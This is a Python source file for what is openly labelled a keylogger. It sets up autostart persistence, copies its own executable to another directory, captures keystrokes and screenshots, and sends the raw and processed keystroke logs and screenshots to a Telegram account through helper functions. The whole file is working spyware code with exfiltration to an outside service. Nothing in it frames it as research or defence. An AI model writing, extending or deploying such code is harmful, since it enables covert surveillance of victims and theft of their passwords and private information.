import os
from PIL import ImageGrab
import sys
import shutil
from log_utils import write_to_log, format_message, process_keys
from telegram_utils import load_credentials_telegram_from_script, send_info_telegram, send_image_telegram, load_credentials_telegram
from constants import AUTOSTART_CONTENT, DUPLICATE_NAME_FILE, AUTOSTART_DIR, DUPLICATE_EXE_DIR, IMG_DIR, IMG_FILE, LOG_FILE, LOG_FILE_2

def create_autostart_entry():
    """
    Creates an autostart entry for the application.

    This function creates an autostart entry for the application by checking if the desktop entry file already exists. If the file does not exist, it creates a new file with the specified content and prints the path of the created autostart entry. If the file already exists, it prints the path of the existing autostart entry.

    Parameters:
        None

    Returns:
        None
    """
    autostart_path = os.path.expanduser(AUTOSTART_DIR)
    if not os.path.exists(autostart_path):
        os.makedirs(autostart_path)

    desktop_entry_path = os.path.join(autostart_path, f'{DUPLICATE_NAME_FILE}.desktop')

    # Check if the desktop entry file already exists
    if not os.path.exists(desktop_entry_path):
        with open(desktop_entry_path, 'w') as desktop_entry_file:
            desktop_entry_file.write(AUTOSTART_CONTENT)

        print(f'Autostart entry created at: {desktop_entry_path}')
    else:
        print(f'Autostart entry already exists at: {desktop_entry_path}')

def duplicate_script():
    """
    Generates a duplicate script by copying the current script executable to a specified directory.

    Parameters:
        None

    Returns:
        None
    """
    duplicate_dir = os.path.expanduser(DUPLICATE_EXE_DIR)

    if not os.path.exists(duplicate_dir):
        os.makedirs(duplicate_dir)

    current_script = sys.executable

    duplicate_script_path = os.path.join(duplicate_dir, DUPLICATE_NAME_FILE)

    if not os.path.isfile(duplicate_script_path):
        shutil.copyfile(current_script, duplicate_script_path)
        os.chmod(duplicate_script_path, 0o755)

def take_screenshot():
    """
    Takes a screenshot and saves it as a PNG file in the specified directory.

    Returns:
        - True if the screenshot is successfully taken and saved.
        - False if an exception occurs during the process.

    Raises:
        - Exception: If an error occurs while taking or saving the screenshot.
    """
    try:
        if not os.path.exists(IMG_DIR):
            os.makedirs(IMG_DIR)
            print("Directory {} created successfully!".format(IMG_DIR))

        image_number = 1
        while os.path.isfile('{}{}'.format(IMG_DIR, IMG_FILE + str(image_number) + '.png')):
            image_number += 1

        im = ImageGrab.grab()
        image_name = '{}{}'.format(
            IMG_DIR, IMG_FILE + str(image_number) + '.png')
        im.save(image_name, 'png')

        return im
    except Exception as e:
        print(e)
        return None

def handle_keyboard_interrupt(key_listener):
    """
    Handle a keyboard interrupt event.

    Parameters:
        key_listener (Key_Listener): The key listener object that captures the typed keys.

    Returns:
        None
    """
    # Capture typed keys and process them
    typed_keys = key_listener.get_keys()
    processed_keys = process_keys(typed_keys)
    message = format_message(typed_keys)
    processed_message = format_message(processed_keys)

    # Take screnshot and save it as a PNG file
    screenshot = take_screenshot()

    # Write the message to the log file
    write_to_log(message, LOG_FILE)
    write_to_log(processed_message, LOG_FILE_2)

    credentials = load_credentials_telegram() if (loaded := load_credentials_telegram()) is not None else load_credentials_telegram_from_script()

    # Load credentials a pass to send logs through Telegram
    send_info_telegram(**credentials, message='RAW KEYLOGGER LOG\n\n' + message)
    send_info_telegram(**credentials, message='PROCESSED KEYLOGGER LOG\n\n' + processed_message)
    send_image_telegram(**credentials, image=screenshot)

    try:
        sys.exit(130)
    except SystemExit:
        os._exit(130) 